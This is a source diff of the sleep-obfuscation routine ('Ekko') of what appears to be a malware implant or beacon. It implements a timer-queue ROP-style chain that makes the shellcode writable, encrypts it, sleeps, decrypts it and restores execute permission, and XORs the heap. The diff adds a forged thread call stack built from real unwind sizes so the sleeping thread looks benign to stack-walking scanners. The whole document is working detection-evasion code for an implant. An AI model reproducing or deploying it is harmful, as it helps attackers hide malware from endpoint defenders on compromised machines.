@@ -4,59 +4,18 @@
 #include <Defines.h>
 #include <Internals.h>
 #include <Sleep.h>
+#include <Spoof.h>
 
 #define EKKO_DELAY_MS  100
 #define EKKO_XOR_KEY   0xC0FFEE1337DEADULL
 
-// RtlEncryptMemory / RtlDecryptMemory option: same-process decryption only
 #define CRYPT_OPT_SAME_PROCESS 0
-
-// Find another thread in the current process and copy its CONTEXT.
-// That context is used as the spoof frame during sleep so the main thread's
-// call stack shows a different thread's walk, not the beacon thread's.
-static DECLFN BOOL Ekko_GetSpoofCtx( Root::Agent* Self, CONTEXT* ctx ) {
-    HANDLE        snap  = nullptr;
-    THREADENTRY32 entry;
-    BOOL          found = FALSE;
-    ULONG         curPid = Self->Session.ProcessID;
-    ULONG         curTid = Self->Session.ThreadID;
-
-    entry.dwSize = sizeof(THREADENTRY32);
-
-    snap = Self->Krnl32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
-    if ( !snap || snap == INVALID_HANDLE_VALUE ) return FALSE;
-
-    if ( !Self->Krnl32.Thread32First( snap, &entry ) ) {
-        Self->Ntdll.NtClose( snap );
-        return FALSE;
-    }
-
-    do {
-        if ( entry.th32OwnerProcessID == curPid &&
-             entry.th32ThreadID        != curTid )
-        {
-            HANDLE thd = Self->Krnl32.OpenThread( THREAD_GET_CONTEXT, FALSE, entry.th32ThreadID );
-            if ( thd ) {
-                ctx->ContextFlags = CONTEXT_ALL;
-                if ( NT_SUCCESS( Self->Ntdll.NtGetContextThread( thd, ctx ) ) )
-                    found = TRUE;
-                Self->Ntdll.NtClose( thd );
-                if ( found ) break;
-            }
-        }
-    } while ( Self->Krnl32.Thread32Next( snap, &entry ) );
-
-    Self->Ntdll.NtClose( snap );
-    return found;
-}
-
 
 DECLFN void Sleep_Ekko( ULONG ms )
 {
     G_AGENT;
     if ( ms == 0 ) return;
 
-    // need cryptbase encrypt/decrypt to be useful; fall back to heap-XOR + Sleep if not
     if ( !Self->Cryptbase.SystemFunction040 || !Self->Cryptbase.SystemFunction041 ) {
         HeapCrypt( EKKO_XOR_KEY );
         Self->Krnl32.Sleep( ms );
@@ -64,27 +23,77 @@ DECLFN void Sleep_Ekko( ULONG ms )
         return;
     }
 
-    HANDLE   Queue     = nullptr;
-    HANDLE   Timer     = nullptr;
-    HANDLE   EvCapture = nullptr;
-    HANDLE   EvStart   = nullptr;
-    HANDLE   EvEnd     = nullptr;
-    PVOID    OldProt   = nullptr;
-    NTSTATUS st;
-    BOOL     hasSpoof  = FALSE;
-    UINT16   ic        = 0;
-    ULONG    delay     = 0;
+    HANDLE    Queue     = nullptr;
+    HANDLE    Timer     = nullptr;
+    HANDLE    EvStart   = nullptr;
+    HANDLE    EvEnd     = nullptr;
+    PVOID     OldProt   = nullptr;
+    NTSTATUS  st;
+    UINT16    ic        = 0;
+    ULONG     delay     = 0;
 
-    // VirtualAlloc: kept outside the tracked heap so HeapCrypt never encrypts these
-    CONTEXT* CtxCapture = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
-    CONTEXT* CtxBkp     = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
-    CONTEXT* CtxSpf     = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
-    CONTEXT* Ctx        = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, 10 * sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
+    // 12 slots: 7 base + up to 3 spoof steps + margin
+    CONTEXT*  CtxCapture = nullptr;
+    HANDLE    EvCapture  = nullptr;
+    CONTEXT*  Ctx        = nullptr;
 
-    if ( !CtxCapture || !CtxBkp || !CtxSpf || !Ctx ) goto _fallback;
+    // sleep-time stack spoof (must be declared before first goto)
+#if PAIN_STACK_SPOOF
+    CONTEXT*  CtxMain   = nullptr;
+    CONTEXT*  CtxFake   = nullptr;
+    PVOID     FakeStack = nullptr;
+    ULONG_PTR fakeRsp   = 0;
+    BOOL      doSpoof   = FALSE;
+#endif
 
-    // must be pre-set so NtGetContextThread fills everything when called in chain
-    CtxBkp->ContextFlags = CONTEXT_ALL;
+    CtxCapture = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT),      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
+    Ctx        = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, 12 * sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
+
+    if ( !CtxCapture || !Ctx ) goto _fallback;
+
+    // sleep-time stack spoof setup
+#if PAIN_STACK_SPOOF
+
+    if ( Self->Config.MainThreadHandle                   &&
+         Self->Spf.Setup.Gadget.Ptr                     &&
+         Self->Spf.Setup.Second.Ptr                     &&
+         Self->Spf.Setup.First.Ptr                      &&
+         Self->Spf.Setup.SleepFsGadget > sizeof(PVOID)  &&
+         Self->Spf.Setup.SleepFsSecond > sizeof(PVOID)  &&
+         Self->Spf.Setup.SleepFsFirst  > sizeof(PVOID) )
+    {
+        CtxMain   = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
+        CtxFake   = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
+        FakeStack = Self->Krnl32.VirtualAlloc( nullptr, 0x2000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
+
+        if ( CtxMain && CtxFake && FakeStack ) {
+            // Build fake stack using REAL (unpadded) UNWIND_INFO sizes so the stack
+            // walker finds each return address at exactly the right offset.
+            ULONG_PTR fsg  = Self->Spf.Setup.SleepFsGadget;
+            ULONG_PTR fs2  = Self->Spf.Setup.SleepFsSecond;
+            ULONG_PTR fs1  = Self->Spf.Setup.SleepFsFirst;
+            ULONG_PTR base = (ULONG_PTR)FakeStack + 0x2000;
+
+            *(ULONG_PTR*)(base - 8)             = 0;                           // NULL terminator
+            *(ULONG_PTR*)(base - 8 - fs1)       = Self->Spf.Setup.First.Ptr;  // RtlUserThreadStart+0x21
+            *(ULONG_PTR*)(base - 8 - fs1 - fs2) = Self->Spf.Setup.Second.Ptr; // BaseThreadInitThunk+0x14
+            fakeRsp                              = base - 8 - fs1 - fs2 - fsg;
+            *(ULONG_PTR*)fakeRsp                 = Self->Spf.Setup.Gadget.Ptr; // kernel32 gadget (leaf)
+
+            // Fake context: thread appears blocked in NtSignalAndWaitForSingleObject
+            // with a clean thread-start call chain below it
+            Mem_Set( CtxFake, 0, sizeof(CONTEXT) );
+            CtxFake->ContextFlags = CONTEXT_FULL;
+            CtxFake->Rsp = fakeRsp;
+            CtxFake->Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSignalAndWaitForSingleObject;
+
+            // ContextFlags for real context capture (filled by NtGetContextThread at runtime)
+            CtxMain->ContextFlags = CONTEXT_ALL;
+
+            doSpoof = TRUE;
+        }
+    }
+#endif
 
     st  = Self->Ntdll.NtCreateEvent( &EvCapture, EVENT_ALL_ACCESS, nullptr, 1, FALSE );
     st |= Self->Ntdll.NtCreateEvent( &EvStart,   EVENT_ALL_ACCESS, nullptr, 1, FALSE );
@@ -94,7 +103,7 @@ DECLFN void Sleep_Ekko( ULONG ms )
     st = Self->Ntdll.RtlCreateTimerQueue( &Queue );
     if ( !NT_SUCCESS(st) || !Queue ) goto _fallback;
 
-    // capture timer pool thread CONTEXT - used as the Rsp/base for all chain frames
+    // capture a timer pool thread's CONTEXT to seed all chain frames
     CtxCapture->ContextFlags = CONTEXT_ALL;
     st  = Self->Ntdll.RtlCreateTimer( Queue, &Timer,
             (PVOID)Self->Ntdll.RtlCaptureContext,
@@ -106,41 +115,37 @@ DECLFN void Sleep_Ekko( ULONG ms )
 
     Self->Ntdll.NtWaitForSingleObject( EvCapture, FALSE, nullptr );
 
-    // try to borrow another thread's context for spoofing the main thread's call stack
-    hasSpoof = Ekko_GetSpoofCtx( Self, CtxSpf );
-
-    // seed every chain frame from the captured context, then adjust Rsp to look like a call
-    for ( int i = 0; i < 10; i++ ) {
+    for ( int i = 0; i < 12; i++ ) {
         Mem_Copy( &Ctx[i], CtxCapture, sizeof(CONTEXT) );
         Ctx[i].Rsp -= sizeof(PVOID);
     }
 
     delay = EKKO_DELAY_MS * 3;
 
-    // --- timer chain (direct Rip assignment: no JMP gadget) ---
-
-    // 0: wait until main thread signals EvStart
+    // 0: wait for main thread signal
     Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.WaitForSingleObjectEx;
     Ctx[ic].Rcx = (DWORD64)EvStart;
     Ctx[ic].Rdx = (DWORD64)INFINITE;
     Ctx[ic].R8  = (DWORD64)FALSE;
     ic++;
 
-    if ( hasSpoof ) {
-        // 1: save main thread's real context before spoofing
+#if PAIN_STACK_SPOOF
+    if ( doSpoof ) {
+        // 1: save main thread's real context
         Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtGetContextThread;
         Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
-        Ctx[ic].Rdx = (DWORD64)CtxBkp;
+        Ctx[ic].Rdx = (DWORD64)CtxMain;
         ic++;
 
-        // 2: replace main thread context with borrowed thread's - spoof the call stack
+        // 2: apply fake context - stack now looks like a clean thread-start wait
         Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSetContextThread;
         Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
-        Ctx[ic].Rdx = (DWORD64)CtxSpf;
+        Ctx[ic].Rdx = (DWORD64)CtxFake;
         ic++;
     }
+#endif
 
-    // 3 (or 1): flip shellcode to RW
+    // 3: flip shellcode to RW
     Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.VirtualProtect;
     Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
     Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
@@ -148,28 +153,28 @@ DECLFN void Sleep_Ekko( ULONG ms )
     Ctx[ic].R9  = (DWORD64)&OldProt;
     ic++;
 
-    // 4 (or 2): encrypt shellcode in place (SystemFunction040 = RtlEncryptMemory)
+    // 4: encrypt shellcode
     Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Cryptbase.SystemFunction040;
     Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
     Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
     Ctx[ic].R8  = (DWORD64)CRYPT_OPT_SAME_PROCESS;
     ic++;
 
-    // 5 (or 3): actual sleep - WaitForSingleObjectEx on current process pseudo-handle
+    // 5: actual sleep
     Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.WaitForSingleObjectEx;
     Ctx[ic].Rcx = (DWORD64)(LONG_PTR)-1;
     Ctx[ic].Rdx = (DWORD64)ms;
     Ctx[ic].R8  = (DWORD64)FALSE;
     ic++;
 
-    // 6 (or 4): decrypt shellcode
+    // 6: decrypt shellcode
     Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Cryptbase.SystemFunction041;
     Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
     Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
     Ctx[ic].R8  = (DWORD64)CRYPT_OPT_SAME_PROCESS;
     ic++;
 
-    // 7 (or 5): restore shellcode to RX
+    // 7: restore RX
     Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.VirtualProtect;
     Ctx[ic].Rcx = (DWORD64)Self->Base.Start;
     Ctx[ic].Rdx = (DWORD64)Self->Base.Length;
@@ -177,27 +182,28 @@ DECLFN void Sleep_Ekko( ULONG ms )
     Ctx[ic].R9  = (DWORD64)&OldProt;
     ic++;
 
-    if ( hasSpoof ) {
-        // 8: restore main thread's real context
+#if PAIN_STACK_SPOOF
+    if ( doSpoof ) {
+        // 8: restore main thread's real context BEFORE signaling EvEnd
+        //    so it resumes from NtSignalAndWaitForSingleObject with the correct RSP
         Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Ntdll.NtSetContextThread;
         Ctx[ic].Rcx = (DWORD64)Self->Config.MainThreadHandle;
-        Ctx[ic].Rdx = (DWORD64)CtxBkp;
+        Ctx[ic].Rdx = (DWORD64)CtxMain;
         ic++;
     }
+#endif
 
-    // last: signal EvEnd - main thread wakes with shellcode decrypted and RX
+    // 9: signal done
     Ctx[ic].Rip = (DWORD64)(ULONG_PTR)Self->Krnl32.SetEvent;
     Ctx[ic].Rcx = (DWORD64)EvEnd;
     ic++;
 
-    // schedule every chain step
     for ( UINT16 i = 0; i < ic; i++, delay += EKKO_DELAY_MS ) {
         Self->Ntdll.RtlCreateTimer( Queue, &Timer,
             (PVOID)Self->Ntdll.NtContinue,
             &Ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD );
     }
 
-    // XOR heap, trigger chain, wait for EvEnd (chain decrypts .text before signaling)
     HeapCrypt( EKKO_XOR_KEY );
     Self->Ntdll.NtSignalAndWaitForSingleObject( EvStart, EvEnd, FALSE, nullptr );
     HeapCrypt( EKKO_XOR_KEY );
@@ -212,10 +218,13 @@ _fallback:
 _cleanup:
     if ( Queue )      Self->Ntdll.RtlDeleteTimerQueue( Queue );
     if ( EvCapture )  Self->Ntdll.NtClose( EvCapture );
-    if ( EvStart   )  Self->Ntdll.NtClose( EvStart   );
-    if ( EvEnd     )  Self->Ntdll.NtClose( EvEnd     );
+    if ( EvStart )    Self->Ntdll.NtClose( EvStart );
+    if ( EvEnd )      Self->Ntdll.NtClose( EvEnd );
     if ( CtxCapture ) Self->Krnl32.VirtualFree( CtxCapture, 0, MEM_RELEASE );
-    if ( CtxBkp     ) Self->Krnl32.VirtualFree( CtxBkp,    0, MEM_RELEASE );
-    if ( CtxSpf     ) Self->Krnl32.VirtualFree( CtxSpf,    0, MEM_RELEASE );
-    if ( Ctx        ) Self->Krnl32.VirtualFree( Ctx,        0, MEM_RELEASE );
+    if ( Ctx )        Self->Krnl32.VirtualFree( Ctx,        0, MEM_RELEASE );
+#if PAIN_STACK_SPOOF
+    if ( CtxMain )    Self->Krnl32.VirtualFree( CtxMain,   0, MEM_RELEASE );
+    if ( CtxFake )    Self->Krnl32.VirtualFree( CtxFake,   0, MEM_RELEASE );
+    if ( FakeStack )  Self->Krnl32.VirtualFree( FakeStack, 0, MEM_RELEASE );
+#endif
 }
